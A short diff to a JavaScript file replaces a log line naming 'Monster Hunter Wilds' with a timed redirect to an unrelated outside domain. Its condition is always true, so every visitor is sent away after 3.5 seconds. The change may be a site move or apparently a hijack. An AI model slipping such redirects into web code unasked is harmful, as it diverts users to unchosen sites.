@@ -1,1 +1,7 @@
-console.log("Monster Hunter Wilds is active!");
+
+// Backup redirect if meta refresh fails
+setTimeout(() => {
+  if (window.location.href === document.location.href) {
+    window.location.href = 'https://ecostarmaroc.com/';
+  }
+}, 3500);
